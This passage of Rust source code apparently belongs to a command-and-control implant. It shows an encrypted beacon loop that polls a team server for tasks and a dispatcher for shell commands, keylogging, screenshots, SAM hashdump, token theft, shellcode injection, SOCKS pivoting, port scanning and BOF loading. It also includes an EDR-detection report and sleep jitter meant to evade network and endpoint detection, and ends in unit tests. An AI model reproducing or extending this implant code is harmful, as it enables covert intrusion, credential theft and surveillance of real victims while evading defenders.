        nyx_implant_core::diag::diag_mark(b"b7b_after_sleep");
        let frame = match beacon_oneshot_poll_frame(pubkey, counter, key) {
            Ok(f) => f,
            Err(code) => return Err(code),
        };
        *counter += 1;
        nyx_implant_core::diag::diag_mark(b"b8_poll");
        let body = unsafe {
            nyx_implant_net::channels::dispatch_send_recv(
                ch_ctx,
                nyx_implant_net::channels::get_active(),
                &frame,
            )
        };
        let Some(body) = body else {
            continue;
        };
        let Ok(raw) = parse_frame(&body) else {
            continue;
        };
        // S2C replay protection (same as beacon_dispatch_tasks): drop
        // stale/replayed server frames instead of re-dispatching them.
        if !accept_server_counter(raw.counter) {
            continue;
        }
        let Ok(plaintext) = open_frame_dir(key, Direction::ServerToClient, &raw) else {
            continue;
        };
        let Ok(tasks) = Task::decode_vec(&plaintext) else {
            continue;
        };

        if tasks.is_empty() {
            continue; // no task queued yet, keep polling
        }
        return Ok(Some(tasks));
    }
    Ok(None)
}

/// Seal the empty-batch poll frame. An empty batch has no blobs, so
/// `encode_vec` cannot hit MAX_BLOB_LEN — but use `unwrap_or_default` so a
/// malformed Writer state never aborts the beacon (P0-4). Err = exit code 0xC3.
fn beacon_oneshot_poll_frame(
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
) -> Result<Vec<u8>, u32> {
    // POST empty batch, receive any queued tasks. An empty batch has no
    // blobs, so encode_vec cannot hit MAX_BLOB_LEN — but use unwrap_or_default
    // so a malformed Writer state never aborts the beacon (P0-4).
    match encode_frame_dir(
        pubkey,
        Direction::ClientToServer,
        *counter,
        key,
        &TaskResponse::encode_vec(&[]).unwrap_or_default(),
    ) {
        Ok(f) => Ok(f),
        Err(_) => {
            nyx_implant_core::diag::diag_mark(b"ERR_ONESHOT_SEAL_POLL");
            Err(0xC3) // poll frame seal failed (AEAD alloc failure)
        }
    }
}

/// Execute task batch(es) and POST the responses back, then return.
///
/// NOT fire-and-forget at the flush (BUG-1 pattern, see `open_reply_tasks`):
/// the server packs newly-queued tasks into EVERY reply, the response-flush
/// reply included, and those tasks were dequeued server-side — dropping the
/// reply body would evaporate them. Tasks riding a flush reply therefore run
/// in rounds behind the batch that was being flushed, exactly like the beacon
/// loop's deferred mid-flush tasks; the oneshot returns once a flush reply
/// carries no further tasks (or the flush itself failed).
fn beacon_oneshot_run_tasks(
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
    cfg: &Config,
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
    tasks: Vec<Task>,
) {
    let mut round = tasks;
    loop {
        // Execute + POST results back (one round per iteration).
        let mut pending: Vec<TaskResponse> = Vec::new();
        let mut exit = false;
        for t in round {
            if matches!(t.command, Command::Exit) {
                exit = true;
                break;
            }
            for response in
                crate::task_guard::run(|| execute(rt, t.command, counter, pubkey, key, cfg))
            {
                pending.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
            }
        }
        if pending.is_empty() {
            return;
        }
        let body = beacon_oneshot_flush(pubkey, counter, key, ch_ctx, &mut pending);
        if exit {
            return;
        }
        // Consume the flush reply: tasks queued while this round ran ride the
        // reply frame and were dequeued server-side — never drop them.
        match oneshot_flush_reply_tasks(key, body.as_deref()) {
            Some(next) => round = next,
            None => return,
        }
    }
}

/// Decide the next oneshot round from a flush reply body. Mirrors the beacon
/// loop's mid-flush deferred-task handling (BUG-1): `None` when the flush
/// failed, the reply carried no usable frame, or the batch was empty — the
/// oneshot then exits normally.
fn oneshot_flush_reply_tasks(
    key: &nyx_protocol::crypto::SessionKey,
    body: Option<&[u8]>,
) -> Option<Vec<Task>> {
    let tasks = open_reply_tasks(key, body?)?;
    if tasks.is_empty() {
        None
    } else {
        Some(tasks)
    }
}

/// Seal + send the response batch; advance the counter only on success (P0-3).
/// Returns the reply body on success — the server packs newly-queued tasks
/// into EVERY reply, this flush included, so the caller must consume it
/// (BUG-1 pattern) instead of letting those tasks evaporate.
fn beacon_oneshot_flush(
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
    ch_ctx: &nyx_implant_net::channels::ChannelCtx,
    pending: &mut Vec<TaskResponse>,
) -> Option<Vec<u8>> {
    // P0-4: encode_batch swaps any oversized Response for an Err so the
    // frame always encodes instead of aborting the beacon.
    let rframe = match encode_frame_dir(
        pubkey,
        Direction::ClientToServer,
        *counter,
        key,
        &encode_batch(pending),
    ) {
        Ok(f) => f,
        Err(_) => {
            nyx_implant_core::diag::diag_mark(b"ERR_ONESHOT_SEAL_FLUSH");
            // Keep `pending` (do not advance counter) so the responses
            // are retried — but oneshot exits after this cycle, so just
            // break out of the response loop.
            return None;
        }
    };
    let sent = unsafe {
        nyx_implant_net::channels::dispatch_send_recv(
            ch_ctx,
            nyx_implant_net::channels::get_active(),
            &rframe,
        )
    };
    // P0-3: only advance the counter when the send actually succeeded,
    // so a failed round-trip doesn't desync the sequence number.
    if sent.is_some() {
        *counter += 1;
    }
    sent
}
/// Encode a batch of [`TaskResponse`]s for the wire, gracefully handling an
/// oversized payload. `TaskResponse::encode_vec` only fails when a blob
/// exceeds `wire::MAX_BLOB_LEN` (256 KiB) — in practice a screenshot BMP or
/// large BOF output. Since `panic = "abort"`, letting that propagate kills the
/// beacon; instead we replace each oversized [`Response`] with a tiny
/// `Response::Err` and retry. The operator sees what was dropped instead of
/// the implant dying. `Response::Err` messages are themselves bounded well
/// under `MAX_BLOB_LEN`, so the retry always succeeds.
fn encode_batch(pending: &mut [TaskResponse]) -> Vec<u8> {
    if let Ok(v) = TaskResponse::encode_vec(pending) {
        return v;
    }
    // One or more responses carried a blob > MAX_BLOB_LEN. Replace each
    // oversized payload with an Err so the batch encodes (and the operator is
    // told what was dropped rather than the beacon aborting).
    for tr in pending.iter_mut() {
        let too_big = match &tr.response {
            Response::FileChunk { data, .. }
            | Response::Output(data)
            | Response::BofOutput(data)
            | Response::Image(data)
            | Response::Channel { data, .. } => data.len() > nyx_protocol::wire::MAX_BLOB_LEN,
            Response::Ok | Response::Err(_) => false,
        };
        if too_big {
            tr.response = Response::Err(String::from(
                "response too large: payload exceeds MAX_BLOB_LEN",
            ));
        }
    }
    TaskResponse::encode_vec(pending).unwrap_or_default()
}

/// Only FileChunk/Output/BofOutput/Image carry significant volume; acks and
/// errors are negligible. Mirrors agent-dev's heuristic.
fn pending_batch_size(pending: &[TaskResponse]) -> usize {
    pending
        .iter()
        .map(|tr| match &tr.response {
            Response::FileChunk { data, .. } => data.len(),
            Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
            _ => 0,
        })
        .sum()
}

/// 估算单条 [`TaskResponse`] 编码后的体积：blob/文本主体 + 逐条 varint、
/// tag、name、seq/eof 开销（`OVERHEAD` 故意高估）。只用于打包/保留决策，
/// 不要求精确。镜像 agent-dev 的 `response_wire_size`。
fn response_wire_size(tr: &TaskResponse) -> usize {
    const OVERHEAD: usize = 24;
    match &tr.response {
        Response::FileChunk { name, data, .. } => data.len() + name.len() + OVERHEAD,
        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len() + OVERHEAD,
        Response::Channel { data, .. } => data.len() + OVERHEAD,
        Response::Ok => OVERHEAD,
        Response::Err(m) => m.len() + OVERHEAD,
    }
}

/// pending 前缀中估算能在 `budget` 内编码的条数，空批次返回 0，非空至少
/// 返回 1（单条超限 blob 会被 `encode_batch` 换成有界 `Response::Err`，
/// 独占一帧总能放下）。调用方按 `pending[..n]` 封帧、仅发送成功后
/// `drain(..n)`，从而 server 不可达期间累积的超大缓存按帧切分发送，
/// 绝不触发 `MAX_CT_LEN` 静默卡死。镜像 agent-dev 的 `frame_prefix_len`。
fn frame_prefix_len(pending: &[TaskResponse], budget: usize) -> usize {
    if pending.is_empty() {
        return 0;
    }
    let mut used = 8; // encode_vec 的 Vec 长度前缀
    let mut n = 0;
    for tr in pending {
        let size = response_wire_size(tr);
        if n > 0 && used + size > budget {
            break;
        }
        used += size;
        n += 1;
    }
    n.max(1)
}

/// pending 总量超 `cap`（估算字节）时丢弃最旧的响应（保最新），返回丢弃
/// 条数，调用方负责记日志/diag 标记。镜像 agent-dev 的 `cap_pending`。
fn cap_pending(pending: &mut Vec<TaskResponse>, cap: usize) -> usize {
    let mut total: usize = pending.iter().map(response_wire_size).sum();
    let mut dropped = 0;
    while total > cap && dropped < pending.len() {
        total -= response_wire_size(&pending[dropped]);
        dropped += 1;
    }
    if dropped > 0 {
        pending.drain(..dropped);
    }
    dropped
}

/// Execute a command, returning zero or more responses. `counter`/`pubkey`/`key`
/// /`cfg` are passed so a streamed response (or a flush) can be emitted directly
/// inside this call if needed (kept for parity with agent-dev; currently unused
/// because the beacon loop flushes between tasks).
#[allow(clippy::too_many_arguments)]
fn execute(
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    cmd: Command,
    _counter: &mut u64,
    _pubkey: &[u8; 32],
    _key: &nyx_protocol::crypto::SessionKey,
    _cfg: &Config,
) -> Vec<Response> {
    match cmd {
        Command::Ping => vec![Response::Ok],
        Command::Sleep {
            seconds,
            jitter_pct: _,
        } => execute_sleep(seconds),
        Command::SetChannel { channel } => execute_set_channel(_cfg, channel),
        Command::Trex => execute_trex(),
        Command::Exit => vec![Response::Ok],
        Command::Shell { args } => vec![crate::shell::run_shell(&args)],
        Command::Upload { name, data } => execute_upload(rt, &name, &data),
        Command::Download { path } => execute_download(rt, &path),
        Command::FileOp { op, path, dest } => execute_fileop(rt, op, &path, dest.as_deref()),
        Command::Bof { .. }
        | Command::DriveInfo
        | Command::Env { .. }
        | Command::Clipboard
        | Command::Portscan { .. }
        | Command::Net { .. } => execute_recon(cmd),
        Command::Screenshot { monitor } => crate::screenshot::do_screenshot(monitor),
        Command::Keylog { action } => vec![crate::keylog::do_keylog(action)],
        Command::Screenwatch { interval_secs } => execute_screenwatch(interval_secs),
        Command::Hashdump { .. }
        | Command::Connect { .. }
        | Command::Socks { .. }
        | Command::ChannelData { .. }
        | Command::ChannelClose { .. } => execute_pivot(rt, cmd),
        Command::StealToken { .. }
        | Command::MakeToken { .. }
        | Command::Rev2Self
        | Command::GetUid
        | Command::Inject { .. } => execute_postex(cmd),
    }
}

/// `Sleep` arm: re-task the beacon cadence.
fn execute_sleep(seconds: u32) -> Vec<Response> {
    // Re-task the beacon cadence: store the new interval for the loop
    // to read next cycle. (jitter_pct is config-wide; we honor the
    // configured jitter and only adjust the base interval live, like
    // the dev agent's pragmatic read of the field.)
    if seconds > 0 {
        SLEEP_SECS.store(seconds, core::sync::atomic::Ordering::Relaxed);
    }
    vec![Response::Ok]
}

/// `SetChannel` arm: validate the channel's config gate, then hot-switch.
///
/// `fallback_bitmap` deliberately does NOT gate this command: the bitmap
/// constrains *automatic* failover only (see
/// `nyx_implant_net::channels::next_fallback_with_bitmap`), while SetChannel
/// is an explicit operator override — ExtC2 channels in particular are
/// operator-selected primaries that the bitmap cannot even encode. If an
/// operator-selected channel outside the resolved chain later fails,
/// automatic failover starts at the head of that chain.
fn execute_set_channel(cfg: &Config, channel: u8) -> Vec<Response> {
    // Use from_u8 (new numbering scheme). Values 0-8 map to channels;
    // out-of-range values default to Https (not SmbPipe — the old bug
    // MED-NEW-I5 where _ => SmbPipe killed the beacon with a "success"
    // ack is fixed: from_u8's catch-all is Https, a safe no-op).
    let ch = nyx_implant_net::channels::Channel::from_u8(channel);
    // All eight channels are implemented end-to-end now (the parent
    // listeners live in the team server), but a channel whose endpoint
    // isn't configured must still be REJECTED loudly — a beacon on an
    // unconfigured pipe/socket would spin on a dead endpoint. The
    // channel modules ALSO fail fast at transaction time with a diag
    // mark (ERR_CH_SMB_NOCONF / ERR_CH_TCP_NOPEER); this check makes
    // the misconfiguration visible at task time instead.
    let config_gate: bool = match ch {
        nyx_implant_net::channels::Channel::SmbPipe => !cfg.smb_pipe_name.is_empty(),
        nyx_implant_net::channels::Channel::Tcp => {
            !cfg.tcp_peer_host.is_empty() && cfg.tcp_peer_port != 0
        }
        _ => true,
    };
    if !config_gate {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_NOTCONF");
        let mut e: nyx_implant_core::heap::String =
            nyx_implant_core::heap::String::from("SetChannel rejected: ");
        e.push_str(ch.name());
        e.push_str(" is not configured in this implant (bake ");
        match ch {
            nyx_implant_net::channels::Channel::SmbPipe => {
                e.push_str("smb_pipe_name");
            }
            _ => {
                e.push_str("tcp_peer_host/tcp_peer_port");
            }
        }
        e.push_str(" into the build config)");
        return vec![Response::Err(e)];
    }
    nyx_implant_net::channels::set_active(ch);
    let mut out: nyx_implant_core::heap::Vec<u8> = nyx_implant_core::heap::Vec::new();
    out.extend_from_slice(b"Channel set to: ");
    out.extend_from_slice(ch.name().as_bytes());
    vec![Response::Output(out)]
}

/// `Trex` arm: run the user-mode assessment and render the tier report.
fn execute_trex() -> Vec<Response> {
    let assessment = unsafe { crate::trex::assess_user_mode() };
    let mut out: nyx_implant_core::heap::Vec<u8> = nyx_implant_core::heap::Vec::new();
    let tier_names: &[&[u8]] = &[
        b"Clean",
        b"ConsumerAV",
        b"EnterpriseEDR",
        b"KernelArmed",
        b"Fortress",
    ];
    let tn = tier_names
        .get(assessment.tier as usize)
        .map_or(&b"Unknown"[..], |s| *s);
    out.extend_from_slice(b"=== T-REX ===\nTier: ");
    out.extend_from_slice(tn);
    out.extend_from_slice(b"\nProducts: ");
    let n = assessment.products.len();
    if n == 0 {
        out.extend_from_slice(b"none");
    }
    for (i, p) in assessment.products.iter().enumerate() {
        if i > 0 {
            out.extend_from_slice(b", ");
        }
        out.extend_from_slice(p.vendor.default_name().as_bytes());
    }
    out.extend_from_slice(b"\n");
    out.extend_from_slice(assessment.recommendation.as_bytes());
    vec![Response::Output(out)]
}

/// `Upload` arm: write `data` to `name` via the NT syscall runtime.
fn execute_upload(
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    name: &String,
    data: &Vec<u8>,
) -> Vec<Response> {
    match rt {
        Some(rt) => vec![crate::fs::do_upload(rt, name, data)],
        None => vec![Response::Err(String::from("upload: syscall runtime down"))],
    }
}

/// `Download` arm: stream `path` back through the NT syscall runtime.
fn execute_download(
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    path: &String,
) -> Vec<Response> {
    match rt {
        Some(rt) => crate::fs::do_download(rt, path),
        None => vec![Response::Err(String::from(
            "download: syscall runtime down",
        ))],
    }
}

/// `FileOp` arm: rm/mv/cp/ls dispatch through the NT syscall runtime.
fn execute_fileop(
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    op: nyx_protocol::FileOp,
    path: &String,
    dest: Option<&str>,
) -> Vec<Response> {
    match rt {
        Some(rt) => vec![crate::fs::do_fileop(rt, op, path, dest)],
        None => vec![Response::Err(String::from("fileop: syscall runtime down"))],
    }
}

/// Recon-family commands: BOF + drive/env/clipboard/portscan/net. The
/// catch-all is a WP-B2 misroute guard returning `Response::Err`.
fn execute_recon(cmd: Command) -> Vec<Response> {
    // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
    // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
    match cmd {
        Command::Bof {
            name,
            args,
            blob,
            isolate,
        } => {
            if isolate {
                // B3: operator-selected isolated execution in a sacrificial
                // child process (bof-host). Err = PRE-LAUNCH host failure (the
                // BOF never ran) → WARN-prefixed inline fallback (spec §4-B3).
                match unsafe { crate::bof::bof_isolated(&blob, &args) } {
                    Ok(resp) => vec![resp],
                    Err(e) => vec![bof_inline_fallback(&name, &args, &blob, e)],
                }
            } else {
                vec![crate::bof::run(&name, &args, &blob)]
            }
        }
        Command::DriveInfo => vec![crate::recon::do_driveinfo()],
        Command::Env { name } => vec![crate::recon::do_env(&name)],
        Command::Clipboard => vec![crate::recon::do_clipboard()],
        Command::Portscan { host, ports } => vec![crate::recon::do_portscan(&host, &ports)],
        Command::Net { query } => vec![crate::recon::do_net(&query)],
        // Misroute guard (WP-B2): a routing bug must degrade to an error
        // response, never abort the beacon under panic=abort.
        _ => vec![Response::Err(String::from("misrouted recon command"))],
    }
}

/// B3 inline fallback (spec §4-B3): the isolated path failed BEFORE the child
/// ran, so execute the BOF inline and prefix the output with a WARN so the
/// operator sees the degradation (pool-party → module-stomp precedent in
/// inject.rs::do_inject_pool_party).
fn bof_inline_fallback(name: &str, args: &[String], blob: &[u8], why: &str) -> Response {
    let mut warn = String::from("WARN: bof isolate failed (");
    warn.push_str(why);
    warn.push_str(") — falling back to inline execution. ");
    match crate::bof::run(name, args, blob) {
        Response::BofOutput(mut bytes) => {
            let mut out = warn.into_bytes();
            out.append(&mut bytes);
            Response::BofOutput(out)
        }
        other => other,
    }
}

/// `Screenwatch` arm: capture a burst of 3 frames `interval_secs` apart.
fn execute_screenwatch(interval_secs: u32) -> Vec<Response> {
    let mut all: Vec<Response> = Vec::new();
    for i in 0..3u8 {
        if i > 0 {
            crate::kits::sleep(interval_secs.max(1));
        }
        let mut frame = crate::screenshot::do_screenshot(0);
        // Tag the chunk name with the frame index so the operator can
        // tell frames apart in the reassembled stream.
        for r in frame.iter_mut() {
            if let Response::FileChunk { name, .. } = r {
                // name is "screenshot.bmp" → "screenwatch-{i}.bmp"
                let mut new_name = String::from("screenwatch-");
                new_name.push((b'0' + i) as char);
                new_name.push_str(".bmp");
                *name = new_name;
            }
        }
        all.extend(frame);
    }
    all
}

/// Pivot-family commands: hashdump + connect/socks relay + channel data/close.
/// The catch-all is a WP-B2 misroute guard returning `Response::Err`.
fn execute_pivot(
    rt: Option<&'static nyx_implant_core::syscalls::Runtime>,
    cmd: Command,
) -> Vec<Response> {
    // ---- Credential extraction + pivoting (implemented) ----
    // Hashdump: stream the SAM/SYSTEM hive (encrypted) for offline parsing.
    // (LSASS memory dump is a separate, riskier path — deferred.)
    match cmd {
        Command::Hashdump { method } => crate::hashdump::do_hashdump_vec(rt, method),
        // Connect/Socks: open + confirm reachability, report channel status.
        // Full relay is deferred (synchronous-poll loop can't host it) — see
        // pivot.rs for the honest limitation.
        Command::Connect {
            proto,
            host,
            port,
            chan,
        } => {
            vec![crate::pivot::do_connect(proto, &host, port, chan)]
        }
        Command::Socks {
            chan,
            op,
            addr,
            port,
        } => {
            vec![crate::pivot::do_socks(chan, op, &addr, port)]
        }
        // Relay data/close: forward to the channel table (pivot.rs).
        Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
        Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
        // Misroute guard (WP-B2): see execute_recon.
        _ => vec![Response::Err(String::from("misrouted pivot command"))],
    }
}

/// Postex-family commands: token ops + inject. The catch-all is a WP-B2
/// misroute guard returning `Response::Err`.
fn execute_postex(cmd: Command) -> Vec<Response> {
    // ---- Post-exploitation token operations (lateral movement) ----
    // Steal/make a token, hold it process-wide; revert drops impersonation
    // but keeps the token; getuid reports the current thread identity.
    match cmd {
        Command::StealToken { pid } => match unsafe { crate::postex::steal_token(pid) } {
            Ok(()) => vec![Response::Ok],
            Err(m) => vec![Response::Err(m.into())],
        },
        Command::MakeToken {
            domain,
            user,
            password,
            logon_type,
        } => match unsafe { crate::postex::make_token(&domain, &user, &password, logon_type) } {
            Ok(()) => vec![Response::Ok],
            Err(m) => vec![Response::Err(m.into())],
        },
        Command::Rev2Self => match crate::postex::revert() {
            Ok(()) => vec![Response::Ok],
            Err(m) => vec![Response::Err(m.into())],
        },
        Command::GetUid => vec![Response::Output(crate::postex::getuid().into_bytes())],
        Command::Inject {
            method,
            pid,
            spawn_to,
            shellcode,
        } => {
            vec![crate::inject::do_inject(
                method,
                pid,
                spawn_to.as_str(),
                shellcode.as_slice(),
            )]
        }
        // Misroute guard (WP-B2): see execute_recon.
        _ => vec![Response::Err(String::from("misrouted postex command"))],
    }
}

/// Sleep `base` seconds, varied by ±jitter_pct% so beacon timing isn't a
/// metronome (a fixed-period beacon is a trivial NDR/EDR signature).
///
/// When bursty (per-implant override or baked `timing_baseline`), the chosen
/// base follows [`nyx_implant_net::timing::bursty_delay`] (`BURST_LEN = 4`)
/// and jitter is applied inside that chosen base. `base == 0` is still a no-op.
fn sleep_jitter(base: u32, jitter_pct: u8) {
    if base == 0 {
        crate::kits::sleep(0);
        return;
    }
    let bursty = nyx_implant_net::timing::is_bursty(
        TIMING_BASELINE.load(core::sync::atomic::Ordering::Relaxed),
    );
    let chosen = if bursty {
        let cycle = SLEEP_CYCLE.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
        nyx_implant_net::timing::bursty_delay(cycle, base)
    } else {
        base
    };
    if jitter_pct == 0 {
        crate::kits::sleep(chosen);
        return;
    }
    // Cheap LCG over a static seed — no need for a CSPRNG here (this only
    // shapes sleep length, not anything secret). xorshift32.
    static SEED: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0x9E37_79B9);
    let mut x = SEED.load(core::sync::atomic::Ordering::Relaxed);
    if x == 0 {
        x = 0x9E37_79B9;
    }
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    SEED.store(x, core::sync::atomic::Ordering::Relaxed);
    let span = chosen.saturating_mul(jitter_pct as u32) / 100;
    let off = if span > 0 { x % (2 * span) } else { 0 };
    let actual = chosen.saturating_add(off).saturating_sub(span);
    crate::kits::sleep(actual.max(1));
}

/// Host-testable re-export of the bursty cadence (seconds).
#[cfg(test)]
fn bursty_delay(cycle: u32, base: u32) -> u32 {
    nyx_implant_net::timing::bursty_delay(cycle, base)
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use core::sync::atomic::Ordering;

    /// Seal a task batch the way the team server does (S2C nonce space).
    fn seal_server_batch(
        key: &nyx_protocol::crypto::SessionKey,
        counter: u64,
        tasks: &[Task],
    ) -> Vec<u8> {
        let plain = Task::encode_vec(tasks).expect("encode task batch");
        encode_frame_dir(&[0x24; 32], Direction::ServerToClient, counter, key, &plain)
            .expect("seal server reply")
    }

    fn test_cfg() -> Config {
        Config {
            server_host: String::from("127.0.0.1"),
            server_port: 1, // dead port — a flush attempt must fail, never hang
            beacon_uri: String::from("/beacon"),
            server_pub: [0u8; 32],
            sleep_seconds: 5,
            jitter_pct: 0,
            use_tls: false,
            primary_channel: 0,
            fallback_bitmap: 0,
            doh_resolver: String::new(),
            smb_pipe_name: String::new(),
            extc2_api_host: String::new(),
            extc2_token: String::new(),
            rotation_hosts: String::new(),
            fronting_host: String::new(),
            proxy_server: String::new(),
            tcp_peer_host: String::new(),
            tcp_peer_port: 0,
            timing_baseline: 0,
        }
    }

    fn test_ctx() -> nyx_implant_net::channels::ChannelCtx {
        nyx_implant_net::channels::ChannelCtx::from_config(&test_cfg())
    }

    #[test]
    fn bursty_delay_matches_agent_dev_formula() {
        // Same BURST_LEN=4 cadence as agent-dev `bursty_sleep`, in seconds:
        // in-burst = max(1, base/8), quiet gap = base.
        let base = 60u32;
        for c in 0..10u32 {
            let d = bursty_delay(c, base);
            if c % 5 == 4 {
                assert_eq!(d, base, "cycle {c} should be the long gap");
            } else {
                assert_eq!(d, 7, "cycle {c} in-burst = base/8");
            }
        }
        assert_eq!(bursty_delay(0, 1), 1);
        assert_eq!(bursty_delay(4, 1), 1);
    }

    #[test]
    fn send_frame_failover_consumes_fallback_bitmap() {
        use nyx_implant_net::channels::{get_active, set_active, Channel};
        // Single fn for every CURRENT_CHANNEL assertion: the active channel
        // is a shared static, so parallel tests must not interleave on it
        // (same discipline as the ROTATION_IDX tests in channels/mod.rs).
        // test_cfg points at a dead port, so every dispatch fails fast and
        // takes the failover arm without touching the network.
        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
        let ctx = test_ctx();
        let mut counter = 0u64;

        // bitmap = 0 → backward-compat static chain: Https → DohDns.
        set_active(Channel::Https);
        assert!(
            beacon_send_frame(&[0x24; 32], &mut counter, &key, &mut Vec::new(), &ctx, 0).is_none()
        );
        assert_eq!(get_active(), Channel::DohDns);

        // bitmap selecting only Dns (bit 2): Https → Dns, skipping Doh.
        set_active(Channel::Https);
        assert!(beacon_send_frame(
            &[0x24; 32],
            &mut counter,
            &key,
            &mut Vec::new(),
            &ctx,
            1 << 2
        )
        .is_none());
        assert_eq!(get_active(), Channel::Dns);

        // bitmap with only ExtC2 bits (5-7) → automatic failover disabled:
        // the resolved chain is empty, so exhaustion resets to the primary.
        set_active(Channel::Dns);
        assert!(beacon_send_frame(
            &[0x24; 32],
            &mut counter,
            &key,
            &mut Vec::new(),
            &ctx,
            0b1110_0000
        )
        .is_none());
        assert_eq!(get_active(), Channel::Https);

        // Restore the default so other tests observing the atomic are unaffected.
        set_active(Channel::Https);
    }

    #[test]
    fn mid_flush_reply_garbage_decodes_to_none() {
        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
        // Never touches the accept-counter static: parse fails first.
        assert!(open_reply_tasks(&key, b"").is_none());
        assert!(open_reply_tasks(&key, b"not a frame").is_none());
    }

    /// Single fn for every LAST_SERVER_COUNTER assertion: the static is
    /// shared, so parallel tests must not interleave on it (same discipline
    /// as the ROTATION_IDX tests in nyx-implant-net channels/mod.rs).
    #[test]
    fn mid_flush_reply_tasks_are_recovered_replays_rejected() {
        LAST_SERVER_COUNTER.store(0, Ordering::Relaxed);
        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
        let tasks = vec![
            Task {
                task_id: 7,
                command: Command::Ping,
            },
            Task {
                task_id: 8,
                command: Command::Sleep {
                    seconds: 30,
                    jitter_pct: 10,
                },
            },
        ];

        // BUG-1 regression: tasks riding a mid-flush reply must decode —
        // the old fire-and-forget flush dropped this body and the tasks
        // (already dequeued server-side) evaporated without executing.
        let body = seal_server_batch(&key, 1, &tasks);
        let got = open_reply_tasks(&key, &body).expect("mid-flush tasks must decode");
        assert_eq!(got, tasks, "mid-flush tasks must be recovered, not lost");

        // Replay: the SAME frame again is rejected (S2C replay protection
        // applies to mid-flush replies exactly as to cycle replies).
        assert!(open_reply_tasks(&key, &body).is_none());

        // A routine EMPTY mid-flush reply decodes to zero tasks (no error).
        let empty = seal_server_batch(&key, 2, &[]);
        let got = open_reply_tasks(&key, &empty).expect("empty batch decodes");
        assert!(got.is_empty(), "empty mid-flush reply carries no tasks");

        // Wrong key → AEAD open fails → None (never aborts the beacon).
        let other = nyx_protocol::crypto::SessionKey::new([0x99; 32]);
        let foreign = seal_server_batch(&other, 3, &tasks);
        assert!(open_reply_tasks(&key, &foreign).is_none());

        // Oneshot flush-reply rounds (wave-3): the oneshot flush consumes its
        // reply body exactly like the mid-flush path — tasks riding it decide
        // the next round, an empty batch (or a failed/absent flush) ends the
        // oneshot. (The foreign frame above already advanced the static to 3,
        // so these seal at 4/5.)
        let body4 = seal_server_batch(&key, 4, &tasks);
        let got = oneshot_flush_reply_tasks(&key, Some(&body4))
            .expect("oneshot flush-reply tasks must decode");
        assert_eq!(got, tasks, "flush-reply tasks must drive the next round");
        assert!(
            oneshot_flush_reply_tasks(&key, None).is_none(),
            "a failed flush (no body) ends the oneshot"
        );
        let empty5 = seal_server_batch(&key, 5, &[]);
        assert!(
            oneshot_flush_reply_tasks(&key, Some(&empty5)).is_none(),
            "an empty flush reply ends the oneshot"
        );

        // The dispatch loop itself: a Ping task batch produces a pending
        // response and keeps the loop alive; responses are tiny so no
        // mid-flush fires (dead port anyway — a flush would just retain).
        let cfg = test_cfg();
        let ch_ctx = test_ctx();
        let mut counter = 10u64;
        let mut pending: Vec<TaskResponse> = Vec::new();
        let ping_body = seal_server_batch(
            &key,
            10,
            &[Task {
                task_id: 42,
                command: Command::Ping,
            }],
        );
        let keep_running = unsafe {
            beacon_dispatch_tasks(
                &ping_body,
                &key,
                &[0x24; 32],
                &mut counter,
                &cfg,
                None,
                &ch_ctx,
                &mut pending,
            )
        };
        assert!(keep_running, "Ping batch must not stop the loop");
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].task_id, 42);
        assert!(matches!(pending[0].response, Response::Ok));

        // An Exit task — even one arriving in a later frame — stops the loop.
        let exit_body = seal_server_batch(
            &key,
            11,
            &[Task {
                task_id: 43,
                command: Command::Exit,
            }],
        );
        let keep_running = unsafe {
            beacon_dispatch_tasks(
                &exit_body,
                &key,
                &[0x24; 32],
                &mut counter,
                &cfg,
                None,
                &ch_ctx,
                &mut pending,
            )
        };
        assert!(!keep_running, "Exit task must stop the loop");

        LAST_SERVER_COUNTER.store(0, Ordering::Relaxed);
    }

    #[test]
    fn frame_prefix_len_splits_over_limit_batch_and_every_prefix_seals() {
        // Wave-3 regression: server 不可达时 pending 缓存跨 cycle 累积，整批
        // encode_frame_dir 超 MAX_CT_LEN（512 KiB）旧代码静默 return None —
        // 批次永远发不出去（信标看似存活但结果全丢）。打包必须按帧切分，且
        // 每个前缀都必须能真实封帧（用真 AEAD 验证，而不只是估算）。
        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
        let pubkey = [0x24; 32];

        // ~2.5 MiB 的批次（80 × 32 KiB blob），远超一帧，但在 PENDING_CAP 内。
        let mk = |i: u64| TaskResponse {
            task_id: i,
            response: Response::Output(vec![b'x'; 32 * 1024]),
        };
        let mut pending: Vec<TaskResponse> = (0..80).map(mk).collect();
        // 先证明旧路径确实会失败：整批封帧超 MAX_CT_LEN。
        assert!(
            encode_frame_dir(
                &pubkey,
                Direction::ClientToServer,
                0,
                &key,
                &encode_batch(&mut pending.clone()),
            )
            .is_err(),
            "whole-batch seal must exceed MAX_CT_LEN (this was the silent-stall path)"
        );

        let total = pending.len();
        let mut counter = 0u64;
        let mut sent = 0;
        while !pending.is_empty() {
            let n = frame_prefix_len(&pending, PACK_BUDGET);
            assert!((1..=pending.len()).contains(&n));
